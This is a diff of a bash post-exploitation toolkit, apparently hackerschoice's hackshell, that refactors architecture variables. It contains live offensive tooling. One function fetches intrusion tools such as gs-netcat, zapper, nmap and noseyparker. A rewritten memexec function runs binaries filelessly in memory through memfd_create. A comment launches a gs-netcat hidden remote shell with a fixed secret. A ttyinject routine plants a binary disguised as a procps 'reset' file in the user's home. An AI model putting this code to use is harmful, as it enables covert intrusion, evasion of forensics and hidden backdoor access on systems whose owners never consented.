@@ -684,51 +684,51 @@ _bin_single() {
     local single="${1}" # might be empty "".
 
     unset _HS_SINGLE_MATCH
-    # bin_dl anew         "https://bin.pkgforge.dev/${a}/anew-rs" # fuck anew-rs, it needs argv[1] and is not compatible.
-    bin_dl anew         "https://bin.pkgforge.dev/${a}/anew"
-    bin_dl awk          "https://bin.pkgforge.dev/${a}/gawk"
-    # bin_dl awk          "https://bin.pkgforge.dev/${a}/awk"
-    bin_dl base64       "https://bin.pkgforge.dev/${a}/base64"
-    bin_dl busybox      "https://bin.pkgforge.dev/${a}/busybox"
-    bin_dl curl         "https://bin.pkgforge.dev/${a}/curl"
+    # bin_dl anew         "https://bin.pkgforge.dev/${HS_ARCH}/anew-rs" # fuck anew-rs, it needs argv[1] and is not compatible.
+    bin_dl anew         "https://bin.pkgforge.dev/${HS_ARCH}/anew"
+    bin_dl awk          "https://bin.pkgforge.dev/${HS_ARCH}/gawk"
+    # bin_dl awk          "https://bin.pkgforge.dev/${HS_ARCH}/awk"
+    bin_dl base64       "https://bin.pkgforge.dev/${HS_ARCH}/base64"
+    bin_dl busybox      "https://bin.pkgforge.dev/${HS_ARCH}/busybox"
+    bin_dl curl         "https://bin.pkgforge.dev/${HS_ARCH}/curl"
 
-    #bin_dl dbin         "https://bin.pkgforge.dev/${a}/dbin"
-    bin_dl dbin         "https://github.com/xplshn/dbin/releases/latest/download/dbin_${arch_alt}"
+    #bin_dl dbin         "https://bin.pkgforge.dev/${HS_ARCH}/dbin"
+    bin_dl dbin         "https://github.com/xplshn/dbin/releases/latest/download/dbin_${HS_ARCH_ALT}"
     
     # export DBIN_INSTALL_DIR="${XHOME}"
 
-    bin_dl fd           "https://bin.pkgforge.dev/${a}/fd-find"
+    bin_dl fd           "https://bin.pkgforge.dev/${HS_ARCH}/fd-find"
     # bin_dl fd           "https://github.com/orgs/pkgforge/packages/container/package/bincache/fd/official/fd-find"
 
-    bin_dl gost         "https://bin.pkgforge.dev/${a}/gost"
-    bin_dl gs-netcat    "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_${os,,}-${arch}"
-    # bin_dl gs-netcat    "https://bin.pkgforge.dev/${a}/gs-netcat" #fetched straight from https://github.com/hackerschoice/gsocket (avoid GH ratelimit)
-    # bin_dl grep         "https://bin.pkgforge.dev/${a}/grep"
-    bin_dl gzip         "https://bin.pkgforge.dev/${a}/gzip"
-    bin_dl hexdump      "https://bin.pkgforge.dev/${a}/hexdump"
-    bin_dl jq           "https://bin.pkgforge.dev/${a}/jq"
-    # bin_dl nc           "https://bin.pkgforge.dev/${a}/Baseutils/netcat/netcat" #: https://www.libressl.org/
-    bin_dl nc           "https://bin.pkgforge.dev/${a}/ncat"
-    bin_dl netstat      "https://bin.pkgforge.dev/${a}/netstat"
-    bin_dl nmap         "https://bin.pkgforge.dev/${a}/nmap"
-    bin_dl noseyparker  "https://bin.pkgforge.dev/${a}/noseyparker"
+    bin_dl gost         "https://bin.pkgforge.dev/${HS_ARCH}/gost"
+    bin_dl gs-netcat    "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_${os,,}-${HS_ARCH}"
+    # bin_dl gs-netcat    "https://bin.pkgforge.dev/${HS_ARCH}/gs-netcat" #fetched straight from https://github.com/hackerschoice/gsocket (avoid GH ratelimit)
+    # bin_dl grep         "https://bin.pkgforge.dev/${HS_ARCH}/grep"
+    bin_dl gzip         "https://bin.pkgforge.dev/${HS_ARCH}/gzip"
+    bin_dl hexdump      "https://bin.pkgforge.dev/${HS_ARCH}/hexdump"
+    bin_dl jq           "https://bin.pkgforge.dev/${HS_ARCH}/jq"
+    # bin_dl nc           "https://bin.pkgforge.dev/${HS_ARCH}/Baseutils/netcat/netcat" #: https://www.libressl.org/
+    bin_dl nc           "https://bin.pkgforge.dev/${HS_ARCH}/ncat"
+    bin_dl netstat      "https://bin.pkgforge.dev/${HS_ARCH}/netstat"
+    bin_dl nmap         "https://bin.pkgforge.dev/${HS_ARCH}/nmap"
+    bin_dl noseyparker  "https://bin.pkgforge.dev/${HS_ARCH}/noseyparker"
     # [ "$arch" = "x86_64" ] && bin_dl noseyparker "https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static"
-    bin_dl openssl      "https://bin.pkgforge.dev/${a}/openssl"
-    bin_dl ping         "https://bin.pkgforge.dev/${a}/ping"
-    bin_dl ps           "https://bin.pkgforge.dev/${a}/ps"
-    bin_dl reptyr       "https://bin.pkgforge.dev/${a}/reptyr"
-    bin_dl rg           "https://bin.pkgforge.dev/${a}/ripgrep"
-    bin_dl rsync        "https://bin.pkgforge.dev/${a}/rsync"
-    bin_dl script       "https://bin.pkgforge.dev/${a}/script"
-    bin_dl sed          "https://bin.pkgforge.dev/${a}/sed"
-    bin_dl socat        "https://bin.pkgforge.dev/${a}/socat"
-    bin_dl strace       "https://bin.pkgforge.dev/${a}/strace"
-    bin_dl tar          "https://bin.pkgforge.dev/${a}/tar"
-    bin_dl tcpdump      "https://bin.pkgforge.dev/${a}/tcpdump"
-    # bin_dl vi           "https://bin.pkgforge.dev/${a}/vi"
-    bin_dl vim          "https://bin.pkgforge.dev/${a}/vim"
+    bin_dl openssl      "https://bin.pkgforge.dev/${HS_ARCH}/openssl"
+    bin_dl ping         "https://bin.pkgforge.dev/${HS_ARCH}/ping"
+    bin_dl ps           "https://bin.pkgforge.dev/${HS_ARCH}/ps"
+    bin_dl reptyr       "https://bin.pkgforge.dev/${HS_ARCH}/reptyr"
+    bin_dl rg           "https://bin.pkgforge.dev/${HS_ARCH}/ripgrep"
+    bin_dl rsync        "https://bin.pkgforge.dev/${HS_ARCH}/rsync"
+    bin_dl script       "https://bin.pkgforge.dev/${HS_ARCH}/script"
+    bin_dl sed          "https://bin.pkgforge.dev/${HS_ARCH}/sed"
+    bin_dl socat        "https://bin.pkgforge.dev/${HS_ARCH}/socat"
+    bin_dl strace       "https://bin.pkgforge.dev/${HS_ARCH}/strace"
+    bin_dl tar          "https://bin.pkgforge.dev/${HS_ARCH}/tar"
+    bin_dl tcpdump      "https://bin.pkgforge.dev/${HS_ARCH}/tcpdump"
+    # bin_dl vi           "https://bin.pkgforge.dev/${HS_ARCH}/vi"
+    bin_dl vim          "https://bin.pkgforge.dev/${HS_ARCH}/vim"
     bin_dl zapper       "https://github.com/hackerschoice/zapper/releases/latest/download/zapper-${os,,}-${arch}"
-    bin_dl zgrep        "https://bin.pkgforge.dev/${a}/zgrep"
+    bin_dl zgrep        "https://bin.pkgforge.dev/${HS_ARCH}/zgrep"
 
     { [ -z "$single" ] || [ "$single" == "busybox" ]; } && {
         # Only create busybox-bins for bins that do not yet exist.
@@ -743,24 +743,17 @@ _bin_single() {
         local loc="${single}"
         [ "$str" == "cme" ] && HS_WARN "CME is obsolete. Try ${CDC}bin netexec${CN}"
         [ "$str" == "crackmapexec" ] && HS_WARN "CrackMapExec is obsolete. Try ${CDC}bin netexec${CN}"
-        bin_dl "${str}" "https://bin.pkgforge.dev/${a}/${loc}"
+        bin_dl "${str}" "https://bin.pkgforge.dev/${HS_ARCH}/${loc}"
     }
 }
 
 bin() {
-    local arch arch_alt os
-    local a
+    local os
     local optsstr="$*"
 
     hs_mkxhome
-    arch="$(uname -m)"
     os="$(uname -s)"
     [ -z "$os" ] && os="Linux"
-    [ -z "$arch" ] && arch="x86_64"
-    a="${arch}"
-    [ "$arch" == "x86_64" ] && arch_alt="amd64"
-    [ "$arch" == "aarch64" ] && arch_alt="arm64"
-    [ -z "$arch_alt" ] && arch_alt="$arch"
 
     if [ $# -eq 0 ]; then
         _bin_single # install all
@@ -1529,24 +1522,30 @@ xdestruct() {
     [ -n "$_HS_PATH_ORIG" ] && export PATH="$_HS_PATH_ORIG"
 }
 
+_memexec() {
+    local name="${1}"
+
+    shift
+    perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"'"${name:-/usr/bin/python3}"'",@ARGV' -- "$@"
+    return $?
+}
+
 # memexec /bin/sh -c "echo hi"
 # memexec -c "echo hi" </bin/sh
-# GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec <(curl -SsfL https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$(uname -m))
+# GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec gs-netcat
 memexec() {
-    local stropen strread
-    local strargv0='"foo", '
-    [ -t 0 ] && {
-        stropen="open(\$i, '<', '$1') or die 'open: \$!';"
-        strread='$i'
-        unset strargv0
-    }
-    perl -e '$f=syscall(319, $n="", 1);
-if(-1==$f){ $f=syscall(279, $n="", 1); if(-1==$f){ die "memfd_create: $!";}}
-'"${stropen}"'
-open($o, ">&=".$f) or die "open: $!";
-while(<'"${strread:-STDIN}"'>){print $o $_;}
-exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
+    local fn
+    local prg="$1"
+
+    [ ! -t 0 ] && { _memexec "" "$@"; return $?; }
+
+    shift
+    fn="$(which "$prg" 2>/dev/null)" && { _memexec "${prg}" "$@" <"$fn"; return $?; }
+    [ "$prg" != "${prg##*/}" ] && { echo >&2 "Command not found: $prg"; return 255; }
+    dl "https://bin.pkgforge.dev/${HS_ARCH}/${prg}" | { _memexec "${prg}" "$@"; return $?; }
 }
+
+mx() { memexec "$@"; }
 
 ttyinject() {
     local is_mkdir
@@ -1559,7 +1558,7 @@ ttyinject() {
     [ ! -d "${_HS_HOME_ORIG}/.config/procps" ] && { mkdir -p "${_HS_HOME_ORIG}/.config/procps" || return; is_mkdir=1; }
 
     [ ! -f "${_HS_HOME_ORIG}/.config/procps/reset" ] && {
-        dl "https://github.com/hackerschoice/ttyinject/releases/download/v1.1/ttyinject-linux-$(uname -m)" >"${_HS_HOME_ORIG}/.config/procps/reset" || return
+        dl "https://github.com/hackerschoice/ttyinject/releases/download/v1.1/ttyinject-linux-${HS_ARCH}" >"${_HS_HOME_ORIG}/.config/procps/reset" || return
     }
     chmod 755 "${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; return; }
 
@@ -1631,8 +1630,8 @@ hs_init() {
 
     _hs_init_rootfs
     [ -z "$BASH" ] && {
-        str="https://bin.pkgforge.dev/$(uname -m)/bash"
-        [[ "$(uname -m)" == i686 ]] && str='https://github.com/polaco1782/linux-static-binaries/raw/refs/heads/master/x86-i686/bash'
+        str="https://bin.pkgforge.dev/${HS_ARCH}/bash"
+        [[ "${HS_ARCH}" == i686 ]] && str='https://github.com/polaco1782/linux-static-binaries/raw/refs/heads/master/x86-i686/bash'
         HS_WARN "Shell is not BASH. Try:
 ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
         sleep 2
@@ -1654,6 +1653,12 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
     HS_PY="${HS_PY##*/}"
 
     TERM="xterm-256color"
+
+    HS_ARCH="$(uname -m 2>/dev/null)"
+    [ -z "$HS_ARCH" ] && HS_ARCH="x86_64"
+    [ "$HS_ARCH" == "x86_64" ] && HS_ARCH_ALT="amd64"
+    [ "$HS_ARCH" == "aarch64" ] && HS_ARCH_ALT="arm64"
+    [ -z "$HS_ARCH_ALT" ] && HS_ARCH_ALT="$HS_ARCH"
 
     _HS_GREP_COLOR_NEVER=()
     echo test | grep --color=never -qF test 2>/dev/null && _HS_GREP_COLOR_NEVER=("--color=never")
